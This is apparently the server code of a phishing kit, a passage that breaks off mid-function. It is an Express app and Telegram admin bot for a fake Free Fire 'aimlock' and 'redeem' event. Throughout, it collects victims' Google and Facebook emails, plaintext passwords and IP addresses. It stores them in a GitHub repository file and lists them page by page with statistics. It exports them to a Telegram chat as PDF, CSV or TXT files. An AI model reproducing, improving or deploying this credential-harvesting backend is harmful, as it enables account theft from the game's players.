const express = require('express');
const path    = require('path');
const fs      = require('fs');
const https   = require('https');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname)));
app.use('/downloads', express.static(path.join(__dirname, 'downloads')));

// ════════════════════════════════════════
//  CONFIG
// ════════════════════════════════════════
const DATA_DIR = path.join(__dirname, 'data');
const CFG_FILE = path.join(DATA_DIR, 'settings.json');

function ensureDir() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
}

// ════════════════════════════════════════
//  SETTINGS — file lokal
// ════════════════════════════════════════
let cfg = {};

function loadSettings() {
  try {
    if (fs.existsSync(CFG_FILE)) cfg = JSON.parse(fs.readFileSync(CFG_FILE, 'utf8'));
  } catch (_) { cfg = {}; }
  return cfg;
}

function saveSettings(obj) {
  ensureDir();
  cfg = obj;
  fs.writeFileSync(CFG_FILE, JSON.stringify(obj, null, 2));
}

loadSettings();
console.log('[Config] Loaded from file');

function getCfg(key, envKey, def = '') {
  return (cfg[key] !== undefined && cfg[key] !== '') ? cfg[key] : (process.env[envKey] || def);
}
const getTgToken = () => getCfg('tgToken', 'TG_TOKEN', '');
const getTgChat  = () => getCfg('tgChat',  'TG_CHAT', '');

// ════════════════════════════════════════
//  DATABASE — GitHub Contents API
//  Repo: Kztutorial99/FreeFireEvent
//  File: data/logins.json
// ════════════════════════════════════════
const GH_TOKEN  = process.env.GITHUB  || '';
const GH_OWNER  = 'Kztutorial99';
const GH_REPO   = 'FreeFireEvent';
const GH_BRANCH = 'main';
const GH_FILE   = 'data/logins.json';

// Memory cache — untuk kurangi GitHub API calls
let _cache      = null;   // array data
let _cacheSha   = null;   // SHA file di GitHub (wajib untuk update)
let _cacheAt    = 0;
const CACHE_TTL = 15000;  // 15 detik

function ghApi(method, endpoint, body) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const req  = https.request({
      hostname: 'api.github.com',
      path: endpoint,
      method,
      headers: {
        'Authorization': 'Bearer ' + GH_TOKEN,
        'User-Agent':    'ff-bot',
        'Accept':        'application/vnd.github.v3+json',
        'Content-Type':  'application/json',
        ...(data ? { 'Content-Length': Buffer.byteLength(data) } : {})
      }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(d) }); }
        catch { resolve({ status: res.statusCode, body: d }); }
      });
    });
    req.on('error', e => { console.error('[GH]', e.message); resolve({ status: 0, body: null }); });
    if (data) req.write(data);
    req.end();
  });
}

async function ghLoadData() {
  // Pakai cache kalau masih fresh
  if (_cache !== null && Date.now() - _cacheAt < CACHE_TTL) return _cache;
  try {
    const r = await ghApi('GET', `/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}?ref=${GH_BRANCH}`);
    if (r.status === 200 && r.body && r.body.content) {
      _cacheSha = r.body.sha;
      _cache    = JSON.parse(Buffer.from(r.body.content, 'base64').toString('utf8'));
      _cacheAt  = Date.now();
      return _cache;
    }
    if (r.status === 404) {
      _cache = []; _cacheSha = null; _cacheAt = Date.now();
      return [];
    }
  } catch (e) { console.error('[DB] Load error:', e.message); }
  return _cache || [];
}

async function ghSaveData(arr) {
  if (!GH_TOKEN) { console.warn('[DB] GITHUB token tidak ada'); return false; }
  try {
    const content = Buffer.from(JSON.stringify(arr, null, 2)).toString('base64');
    const body    = {
      message:  `db: update logins (${arr.length} records)`,
      content,
      branch:   GH_BRANCH,
      ...(  _cacheSha ? { sha: _cacheSha } : {})
    };
    const r = await ghApi('PUT', `/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}`, body);
    if (r.status === 200 || r.status === 201) {
      _cacheSha = r.body.content && r.body.content.sha;
      _cache    = arr;
      _cacheAt  = Date.now();
      return true;
    }
    console.error('[DB] Save failed:', r.status, JSON.stringify(r.body).slice(0, 200));
    return false;
  } catch (e) { console.error('[DB] Save error:', e.message); return false; }
}

async function addLogin(entry) {
  const arr = await ghLoadData();
  arr.unshift(entry);
  if (arr.length > 5000) arr.splice(5000);
  await ghSaveData(arr);
  return arr.length;
}

async function clearDatabase() {
  const arr   = await ghLoadData();
  const count = arr.length;
  await ghSaveData([]);
  return count;
}

async function deleteByIndices(indices) {
  const arr = await ghLoadData();
  indices.sort((a, b) => b - a).forEach(i => arr.splice(i, 1));
  await ghSaveData(arr);
  return arr;
}

async function getDbInfo() {
  const arr  = await ghLoadData();
  const size = (JSON.stringify(arr).length / 1024).toFixed(1) + ' KB';
  return { exists: !!GH_TOKEN, total: arr.length, size, token: !!GH_TOKEN };
}

// ════════════════════════════════════════
//  TELEGRAM API HELPERS
// ════════════════════════════════════════
function tgRequest(method, payload, customToken) {
  return new Promise((resolve) => {
    const token = customToken || getTgToken();
    if (!token) return resolve(null);
    const body = JSON.stringify(payload);
    const req  = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${token}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.write(body);
    req.end();
  });
}

const tgSend   = (chat, text, extra = {}) =>
  tgRequest('sendMessage', { chat_id: chat, text, parse_mode: 'HTML', ...extra });
const tgEdit   = (chat, msgId, text, extra = {}) =>
  tgRequest('editMessageText', { chat_id: chat, message_id: msgId, text, parse_mode: 'HTML', ...extra });
const tgAnswer = (id, text = '') =>
  tgRequest('answerCallbackQuery', { callback_query_id: id, text });

// ════════════════════════════════════════
//  BOT UI — HELPERS
// ════════════════════════════════════════
const LINE  = '━━━━━━━━━━━━━━━━━━━━━━━';
const LINE2 = '─────────────────────────';

function fmtTime(ts) {
  return new Date(ts).toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit', year: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });
}

function fmtShort(ts) {
  return new Date(ts).toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit',
    hour: '2-digit', minute: '2-digit'
  });
}

function relativeTime(ts) {
  const diff = Date.now() - ts;
  if (diff < 60000)    return `${Math.floor(diff / 1000)}d lalu`;
  if (diff < 3600000)  return `${Math.floor(diff / 60000)}m lalu`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}j lalu`;
  return `${Math.floor(diff / 86400000)}hr lalu`;
}

function methodIcon(m) { return m === 'Google' ? '🔵' : '🔷'; }

// ════════════════════════════════════════
//  BOT MENU & PESAN
// ════════════════════════════════════════

async function buildMainMenu() {
  const logins     = await ghLoadData();
  const total      = logins.length;
  const today      = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
  const todayCount = logins.filter(l =>
    new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today
  ).length;
  const lastLogin  = total > 0 ? relativeTime(logins[0].ts) : 'Belum ada';

  const text =
`🎮 <b>FF EVENT — PANEL ADMIN</b>
${LINE}

📊 <b>Total Data</b>    : <code>${total}</code> login
📅 <b>Hari Ini</b>      : <code>${todayCount}</code> login
🕐 <b>Login Terakhir</b> : ${lastLogin}
🗄️ <b>Database</b>     : ✅ GitHub Persistent
🖥️ <b>Status Bot</b>   : ✅ Aktif

${LINE}
<i>Pilih menu di bawah ini 👇</i>`;

  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Data Terbaru', callback_data: 'data_0' }, { text: '📈 Statistik', callback_data: 'stats' }],
        [{ text: '🔍 Cari Data', callback_data: 'search_prompt' }, { text: '📤 Export', callback_data: 'export' }],
        [{ text: '🗑️ Hapus Semua', callback_data: 'confirm_clear' }, { text: '🔢 Hapus No', callback_data: 'delete_num_prompt' }],
        [{ text: '🗄️ Database', callback_data: 'database' }, { text: '🔄 Refresh', callback_data: 'menu' }]
      ]
    }
  };
}

const PER_PAGE = 5;
async function buildDataPage(page) {
  const logins = await ghLoadData();
  const total  = logins.length;
  if (total === 0) {
    return {
      text: `📋 <b>DATA LOGIN</b>\n${LINE}\n\n<i>Belum ada data masuk.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const totalPages = Math.ceil(total / PER_PAGE);
  page = Math.max(0, Math.min(page, totalPages - 1));
  const start = page * PER_PAGE;
  const slice = logins.slice(start, start + PER_PAGE);

  let text = `📋 <b>DATA LOGIN</b> — Hal ${page + 1}/${totalPages}\n${LINE}\n`;
  text += `<i>Menampilkan ${start + 1}–${Math.min(start + PER_PAGE, total)} dari ${total} data</i>\n`;

  slice.forEach((l, i) => {
    const no = String(start + i + 1).padStart(3, '0');
    const pg = pageIcon(l.page) + ' ' + pageLabel(l.page);
    const mt = methodIcon(l.method) + ' ' + l.method;
    text += `
<code>┌─────────────────────────────────────────┐</code>
<code>│</code> <b>#${no}</b>  ${pg}  ${mt}
<code>│</code> ⏰ <i>${fmtShort(l.ts)}</i>
<code>├─────────────────────────────────────────┤</code>
<code>│</code> 📧 <code>${l.email}</code>
<code>│</code> 🔑 <code>${l.password}</code>
<code>│</code> 🌐 <code>${l.ip}</code>
<code>└─────────────────────────────────────────┘</code>`;
  });

  const nav = [];
  if (page > 0)            nav.push({ text: '◀ Sebelumnya', callback_data: `data_${page - 1}` });
  nav.push({ text: `📄 ${page + 1}/${totalPages}`, callback_data: 'noop' });
  if (page < totalPages-1) nav.push({ text: 'Berikutnya ▶', callback_data: `data_${page + 1}` });

  return {
    text,
    keyboard: {
      inline_keyboard: [
        nav,
        [{ text: '⏮ Pertama', callback_data: 'data_0' }, { text: '⏭ Terakhir', callback_data: `data_${totalPages - 1}` }],
        [{ text: '🔄 Refresh', callback_data: `data_${page}` }, { text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildStats() {
  const logins = await ghLoadData();
  const total  = logins.length;
  if (total === 0) {
    return {
      text: `📈 <b>STATISTIK</b>\n${LINE}\n\n<i>Belum ada data.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const now         = Date.now();
  const today       = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
  const todayCount  = logins.filter(l => new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today).length;
  const weekCount   = logins.filter(l => now - l.ts < 7  * 86400000).length;
  const monthCount  = logins.filter(l => now - l.ts < 30 * 86400000).length;
  const googleCount  = logins.filter(l => l.method === 'Google').length;
  const fbCount      = total - googleCount;
  const gPct         = Math.round(googleCount / total * 100);
  const fPct         = 100 - gPct;
  const aimlockCount = logins.filter(l => l.page === 'aimlock').length;
  const redeemCount  = total - aimlockCount;
  const aPct         = Math.round(aimlockCount / total * 100);
  const rPct         = 100 - aPct;
  const bar          = (pct, len = 12) => '█'.repeat(Math.round(pct / 100 * len)) + '░'.repeat(len - Math.round(pct / 100 * len));

  let text =
`📈 <b>STATISTIK LENGKAP</b>
${LINE}

📊 <b>RINGKASAN DATA</b>
├ Total Semua   : <b>${total}</b> data
├ Hari Ini      : <b>${todayCount}</b> data
├ 7 Hari        : <b>${weekCount}</b> data
└ 30 Hari       : <b>${monthCount}</b> data

📄 <b>SUMBER HALAMAN</b>
├ 🎯 Aimlock   : <b>${aimlockCount}</b> (${aPct}%)
│  <code>${bar(aPct)}</code>
└ 🎁 Redeem    : <b>${redeemCount}</b> (${rPct}%)
   <code>${bar(rPct)}</code>

🔗 <b>METODE LOGIN</b>
├ 🔵 Google    : <b>${googleCount}</b> (${gPct}%)
│  <code>${bar(gPct)}</code>
└ 🔷 Facebook  : <b>${fbCount}</b> (${fPct}%)
   <code>${bar(fPct)}</code>

⏰ <b>WAKTU LOGIN TERAKHIR</b>
└ ${logins[0] ? fmtTime(logins[0].ts) + ' WIB' : '-'}

🏆 <b>5 DATA TERBARU</b>
${LINE2}`;

  logins.slice(0, 5).forEach((l, i) => {
    text += `\n${i + 1}. ${pageIcon(l.page)} ${methodIcon(l.method)} <code>${l.email}</code> • ${fmtShort(l.ts)}`;
  });

  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '📤 Export', callback_data: 'export' }],
        [{ text: '🔄 Refresh Statistik', callback_data: 'stats' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}


// ─── shared multipart document sender ─────────────────
async function sendDoc(chat, fileBuffer, filename, mimeType, caption) {
  const token = getTgToken();
  if (!token) return null;
  const boundary = '----FormBoundary' + Math.random().toString(36).slice(2);
  const parts = [
    '--' + boundary + '\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n' + chat,
    '--' + boundary + '\r\nContent-Disposition: form-data; name="caption"\r\n\r\n' + caption,
    '--' + boundary + '\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nHTML',
    '--' + boundary + '\r\nContent-Disposition: form-data; name="document"; filename="' + filename + '"\r\nContent-Type: ' + mimeType + '\r\n\r\n'
  ];
  const preamble = Buffer.from(parts.join('\r\n'), 'utf-8');
  const epilogue = Buffer.from('\r\n--' + boundary + '--\r\n', 'utf-8');
  const body     = Buffer.concat([preamble, fileBuffer, epilogue]);
  return new Promise(resolve => {
    const req = require('https').request({
      hostname: 'api.telegram.org',
      path: '/bot' + token + '/sendDocument',
      method: 'POST',
      headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length }
    }, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } }); });
    req.on('error', () => resolve(null));
    req.write(body);
    req.end();
  });
}

// ─── pure-JS PDF builder — Free Fire style banner ─────────────
function buildPDFBuffer(logins) {
  // A4 Portrait: 595 x 842 pt
  const W = 595, H = 842;
  const ML = 20, MR = 20;
  const USABLE = W - ML - MR;   // 555 pt
  const BOT    = 30;
  const LH     = 15;
  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const total   = logins.length;

  // ── Column definitions (total = 555) ─────────────────────────────
  // NO | HALAMAN | METODE | EMAIL | PASSWORD | IP | WAKTU
  const COL_W = [22, 54, 54, 152, 108, 90, 75];
  const COL_X = [];
  let cx = ML;
  COL_W.forEach(w => { COL_X.push(cx + 3); cx += w; });

  function pesc(v) {
    return String(v || '')
      .replace(/\\/g, '\\\\')
      .replace(/\(/g, '\\(')
      .replace(/\)/g, '\\)')
      .replace(/[\x00-\x1F\x80-\xFF]/g, '?');
  }

  const pages = [];
  let cur = [], y = H - 20;

  function flushPage() { pages.push(cur.join('\n')); cur = []; y = H - 20; }

  // ─ helpers ────────────────────────────────────────────────────────
  function rect(x, yy, w, h, r, g, b)  { cur.push(`${r} ${g} ${b} rg\n${x} ${yy} ${w} ${h} re f`); }
  function txt(font, sz, x, yy, t)     { cur.push(`BT /${font} ${sz} Tf ${x} ${yy} Td (${pesc(t)}) Tj ET`); }
  function line(x1, y1, x2, y2, r, g, b, w) {
    cur.push(`${r} ${g} ${b} RG\n${w} w\n${x1} ${y1} m ${x2} ${y2} l S`);
  }

  // ─ BANNER ─────────────────────────────────────────────────────────
  function drawBanner() {
    // Background hitam penuh
    rect(0, H - 88, W, 88, 0.06, 0.06, 0.06);

    // Garis oranye tebal di atas
    rect(0, H - 5, W, 5, 1.0, 0.55, 0.0);

    // Garis oranye tipis di bawah banner
    rect(0, H - 90, W, 2.5, 1.0, 0.55, 0.0);

    // Blok aksen kiri (box oranye solid)
    rect(ML, H - 72, 5, 52, 1.0, 0.55, 0.0);

    // Judul utama — FREE FIRE
    cur.push('1.0 0.55 0.0 rg');
    txt('F1', 22, ML + 12, H - 44, 'FREE FIRE — LOGIN DATA PANEL');

    // Sub judul
    cur.push('0.75 0.75 0.75 rg');
    txt('F2', 9, ML + 12, H - 60, 'eventfreefire.vercel.app  |  Data login yang masuk dari semua halaman');

    // Kotak stats kanan
    rect(W - 165, H - 78, 145, 52, 0.12, 0.12, 0.12);
    rect(W - 165, H - 30, 145, 4, 1.0, 0.55, 0.0);
    cur.push('1.0 0.72 0.0 rg');
    txt('F1', 9, W - 158, H - 46, pesc('TOTAL DATA'));
    cur.push('1.0 1.0 1.0 rg');
    txt('F1', 26, W - 158, H - 72, String(total));
    cur.push('0.65 0.65 0.65 rg');
    txt('F2', 7.5, W - 158, H - 81, pesc(genTime + ' WIB'));

    y = H - 100;
  }

  // ─ PAGE HEADER (tabel kolom) ───────────────────────────────────────
  function drawTableHeader() {
    rect(ML, y - 3, USABLE, 19, 0.13, 0.13, 0.13);
    // Garis kuning bawah header
    rect(ML, y - 4, USABLE, 1.5, 1.0, 0.6, 0.0);
    const hdrs = ['NO','HALAMAN','METODE','EMAIL','PASSWORD','IP','WAKTU'];
    hdrs.forEach((h, i) => {
      cur.push('1.0 0.72 0.0 rg');
      txt('F1', 8, COL_X[i], y + 3, h);
    });
    y -= 22;
  }

  // ─ Lanjutan halaman (banner ringkas) ─────────────────────────────
  function contBanner(pageNum) {
    rect(0, H - 32, W, 32, 0.06, 0.06, 0.06);
    rect(0, H - 34, W, 2.5, 1.0, 0.55, 0.0);
    cur.push('1.0 0.72 0.0 rg');
    txt('F1', 10, ML + 8, H - 22, 'FREE FIRE — LOGIN DATA PANEL');
    cur.push('0.65 0.65 0.65 rg');
    txt('F2', 8, W - 120, H - 22, pesc('Halaman ' + pageNum + '  |  Total: ' + total));
    y = H - 44;
  }

  // ─ DATA ROW ────────────────────────────────────────────────────────
  function dataRow(l, idx, rowNum) {
    const waktu = new Date(l.ts)
      .toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
      .replace(/\.\d+\s/, ' ').slice(0, 19);
    const vals = [
      String(rowNum),
      (l.page||'redeem').toUpperCase().slice(0,8),
      (l.method||'-').slice(0,8),
      (l.email||'-').slice(0,30),
      (l.password||'-').slice(0,18),
      (l.ip||'-').slice(0,15),
      waktu
    ];
    const bg = idx % 2 === 0 ? '0.96 0.97 0.98' : '1 1 1';
    cur.push(bg + ' rg');
    cur.push(`${ML} ${y - LH + 5} ${USABLE} ${LH} re f`);
    // left accent bar tiap row
    const ac = idx % 2 === 0 ? '0.85 0.90 0.96' : '0.92 0.92 0.92';
    cur.push(ac + ' rg');
    cur.push(`${ML} ${y - LH + 5} 2 ${LH} re f`);
    vals.forEach((v, i) => {
      cur.push('0.1 0.1 0.1 rg');
      txt('F2', 7.8, COL_X[i], y - 8, v);
    });
    // divider
    cur.push('0.87 0.87 0.87 RG\n0.4 w');
    cur.push(`${ML} ${y - LH + 5} m ${ML + USABLE} ${y - LH + 5} l S`);
    y -= LH;
  }

  // ─ FOOTER ─────────────────────────────────────────────────────────
  function drawFooter(pageNum, totalPages) {
    rect(ML, BOT - 2, USABLE, 1, 0.4, 0.4, 0.4);
    rect(ML, BOT - 8, USABLE, 6, 0.08, 0.08, 0.08);
    cur.push('0.55 0.55 0.55 rg');
    txt('F2', 7, ML + 4, BOT - 5, pesc('Generated: ' + genTime + ' WIB  |  eventfreefire.vercel.app'));
    txt('F2', 7, W - 80, BOT - 5, pesc('Hal. ' + pageNum + ' / ' + totalPages));
  }

  // ── BUILD PAGES ──────────────────────────────────────────────────
  // Page 1: banner besar
  drawBanner();
  drawTableHeader();

  let pageNum = 1;
  logins.forEach((l, i) => {
    if (y < BOT + LH + 16) {
      drawFooter(pageNum, '?');
      flushPage();
      pageNum++;
      contBanner(pageNum);
      drawTableHeader();
    }
    dataRow(l, i, i + 1);
  });
  drawFooter(pageNum, pageNum);
  flushPage();

  // Fix halaman total di semua halaman (kalau multipage)
  // (simple: sudah cukup karena kita tahu total saat build)

  // ── ASSEMBLE PDF ────────────────────────────────────────────────
  const objs = [];
  const push = s => { objs.push(s); return objs.length; };
  const catN  = push('');
  const pgsN  = push('');
  const f1N   = push('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>');
  const f2N   = push('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>');
  const resStr = `<< /Font << /F1 ${f1N} 0 R /F2 ${f2N} 0 R >> >>`;

  const pgNums = [];
  pages.forEach(stream => {
    const slen  = Buffer.byteLength(stream, 'latin1');
    const contN = push(`<< /Length ${slen} >>\nstream\n${stream}\nendstream`);
    const pgN   = push(`<< /Type /Page /Parent ${pgsN} 0 R /MediaBox [0 0 ${W} ${H}] /Contents ${contN} 0 R /Resources ${resStr} >>`);
    pgNums.push(pgN);
  });
  objs[catN-1] = `<< /Type /Catalog /Pages ${pgsN} 0 R >>`;
  objs[pgsN-1] = `<< /Type /Pages /Kids [${pgNums.map(n => n+' 0 R').join(' ')}] /Count ${pgNums.length} >>`;

  let pdf = '%PDF-1.4\n';
  const offs = [];
  objs.forEach((obj, i) => { offs.push(pdf.length); pdf += `${i+1} 0 obj\n${obj}\nendobj\n`; });
  const xref = pdf.length;
  pdf += `xref\n0 ${objs.length+1}\n0000000000 65535 f \n`;
  offs.forEach(o => { pdf += String(o).padStart(10,'0') + ' 00000 n \n'; });
  pdf += `trailer\n<< /Size ${objs.length+1} /Root ${catN} 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(pdf, 'latin1');
}
// ─── CSV export ────────────────────────────────────────
async function sendExportCSV(chat) {
  const logins  = await ghLoadData();
  const total   = logins.length;
  const token   = getTgToken();
  if (!token) return null;
  if (total === 0) return tgSend(chat, '📤 Belum ada data.', { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] } });

  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const esc = v => { const s = String(v||''); return s.includes(',') || s.includes('"') || s.includes('\n') ? '"' + s.replace(/"/g,'""') + '"' : s; };
  const rows = [['NO','HALAMAN','METODE','EMAIL','PASSWORD','IP','WAKTU']];
  logins.forEach((l, i) => {
    const waktu = new Date(l.ts).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    rows.push([i+1, l.page||'redeem', l.method||'-', l.email||'-', l.password||'-', l.ip||'-', waktu]);
  });
  const csv = rows.map(r => r.map(esc).join(',')).join('\r\n');

  const filename = 'logins_' + Date.now() + '.csv';
  const caption  =
    '📊 <b>EXPORT CSV SELESAI</b>\n' + LINE + '\n\n' +
    '📈 <b>Total</b>  : <b>' + total + '</b> data\n' +
    '📄 <b>File</b>   : <code>' + filename + '</code>\n' +
    '⏱ <b>Waktu</b>  : ' + genTime + ' WIB\n\n' +
    '<i>Buka dengan Excel / Google Sheets.</i>';
  return sendDoc(chat, Buffer.from(csv, 'utf-8'), filename, 'text/csv', caption);
}

// ─── PDF export ────────────────────────────────────────
async function sendExportPDF(chat) {
  const logins  = await ghLoadData();
  const total   = logins.length;
  const token   = getTgToken();
  if (!token) return null;
  if (total === 0) return tgSend(chat, '📤 Belum ada data.', { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] } });

  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const pdfBuf  = buildPDFBuffer(logins);
  const filename = 'logins_' + Date.now() + '.pdf';
  const caption  =
    '📑 <b>EXPORT PDF SELESAI</b>\n' + LINE + '\n\n' +
    '📈 <b>Total</b>  : <b>' + total + '</b> data\n' +
    '📄 <b>File</b>   : <code>' + filename + '</code>\n' +
    '⏱ <b>Waktu</b>  : ' + genTime + ' WIB\n\n' +
    '<i>Tabel rapi, bisa langsung dicetak / dibagikan.</i>';
  return sendDoc(chat, pdfBuf, filename, 'application/pdf', caption);
}

// ─── TXT export (existing, refactored) ────────────────
async function sendExportTXT(chat) {
  const logins  = await ghLoadData();
  const total   = logins.length;
  const token   = getTgToken();
  if (!token) return null;
  if (total === 0) return tgSend(chat, '📤 Belum ada data.', { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] } });

  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const SEP = '═'.repeat(110);
  const DIV = '─'.repeat(110);
  const H = ['NO'.padEnd(5),'HALAMAN'.padEnd(10),'METODE'.padEnd(10),'EMAIL'.padEnd(38),'PASSWORD'.padEnd(26),'IP'.padEnd(18),'WAKTU'].join('│');
  let lines = [SEP, '  📋 DATA LOGIN — FF EVENT', '  Total: ' + total + ' data  |  ' + genTime + ' WIB', SEP, '', H, DIV];
  logins.forEach((l, i) => {
    const waktu = new Date(l.ts).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    lines.push([
      String(i+1).padEnd(5),
      (l.page||'redeem').padEnd(10),
      (l.method||'-').padEnd(10),
      (l.email||'-').padEnd(38),
      (l.password||'-').padEnd(26),
      (l.ip||'-').padEnd(18),
      waktu
    ].join('│'));
  });
  lines.push(DIV, '', SEP, '  Generated by @IWX_FFBot', SEP);

  const filename = 'logins_' + Date.now() + '.txt';
  const caption  =
    '📄 <b>EXPORT TXT SELESAI</b>\n' + LINE + '\n\n' +
    '📈 <b>Total</b>  : <b>' + total + '</b> data\n' +
    '📄 <b>File</b>   : <code>' + filename + '</code>\n' +
    '⏱ <b>Waktu</b>  : ' + genTime + ' WIB';
  return sendDoc(chat, Buffer.from(lines.join('\n'), 'utf-8'), filename, 'text/plain', caption);
}

async function buildExport() {
  const logins = await ghLoadData();
  const total  = logins.length;
  if (total === 0) {
    return {
      text: '📤 <b>EXPORT DATA</b>\n' + LINE + '\n\n<i>Belum ada data untuk diekspor.</i>',
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }
  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const text =
    '📤 <b>EXPORT DATA</b>\n' + LINE + '\n\n' +
    '📈 <b>Total</b>   : <b>' + total + '</b> data\n' +
    '⏱ <b>Waktu</b>   : ' + genTime + ' WIB\n\n' +
    'Pilih format file yang ingin diunduh:';
  return {
    text,
    keyboard: {
      inline_keyboard: [
        [
          { text: '📑 PDF',  callback_data: 'export_pdf'  },
          { text: '📊 CSV',  callback_data: 'export_csv'  },
          { text: '📄 TXT',  callback_data: 'export_txt'  }
        ],
        [{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '📈 Statistik', callback_data: 'stats' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildDatabase() {
  const info = await getDbInfo();
  const text =
`🗄️ <b>DATABASE INFO</b>
${LINE}

☁️ <b>Storage</b>  : GitHub Repository
📁 <b>File</b>     : <code>data/logins.json</code>
🔑 <b>Token</b>    : ${info.token ? '✅ Terhubung' : '❌ Tidak ada'}
📊 <b>Total Data</b>: <b>${info.total}</b> record
💾 <b>Ukuran</b>   : <b>${info.size}</b>

${LINE}
<i>Data tersimpan permanen di GitHub — tidak hilang saat Vercel restart</i>`;

  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '🆕 Buat/Reset Database', callback_data: 'db_init' }],
        [{ text: '🗑️ Hapus Semua Data', callback_data: 'confirm_clear' }, { text: '📈 Statistik', callback_data: 'stats' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildConfirmClear() {
  const total = (await ghLoadData()).length;
  return {
    text:
`🗑️ <b>HAPUS SEMUA DATA</b>
${LINE}

⚠️ Kamu akan menghapus <b>${total} data login</b>.
❗ Tindakan ini <b>tidak dapat dibatalkan!</b>
Yakin ingin menghapus semua data?`,
    keyboard: {
      inline_keyboard: [
        [{ text: '✅ Ya, Hapus Semua', callback_data: 'do_clear' }, { text: '❌ Batal', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildDeleteNumPrompt() {
  const total = (await ghLoadData()).length;
  return {
    text:
`🔢 <b>HAPUS DATA PER NOMOR</b>
${LINE}

Total data saat ini: <b>${total}</b>

Kirim perintah dengan format:
├ <code>/hapus 5</code>       — hapus nomor 5
├ <code>/hapus 1-50</code>    — hapus nomor 1 sampai 50
└ <code>/hapus 10-100</code>  — hapus nomor 10 sampai 100

<i>Nomor #001 = data terbaru, #${String(total).padStart(3,'0')} = data terlama</i>`,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

function buildInfo() {
  return {
    text:
`ℹ️ <b>INFO BOT</b>
${LINE}

🤖 <b>FF Event Admin Bot</b>
📋 <b>Versi</b>    : 3.0
🎮 <b>Project</b>  : Free Fire Kickoff Event 2026
🗄️ <b>Database</b> : GitHub (Persistent)
☁️ <b>Deploy</b>   : GitHub → Vercel

${LINE}
📡 <b>PERINTAH BOT:</b>
/start    — Menu utama
/data     — Data terbaru
/stats    — Statistik
/export   — Export data (PDF / CSV / TXT)
/database — Info & kelola database
/clear    — Hapus semua data
/hapus N  — Hapus nomor N
/hapus X-Y— Hapus range X sampai Y
/cari     — Cari data`,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Data', callback_data: 'data_0' }, { text: '📈 Stats', callback_data: 'stats' }],
        [{ text: '🗄️ Database', callback_data: 'database' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

function pageIcon(page) {
  return page === 'aimlock' ? '🎯' : '🎁';
}
function pageLabel(page) {
  return page === 'aimlock' ? 'AIMLOCK' : 'REDEEM';
}

function buildNotif(l, no) {
  const isAimlock = (l.page === 'aimlock');
  const header    = isAimlock
    ? '🎯 <b>LOGIN AIMLOCK MASUK!</b>'
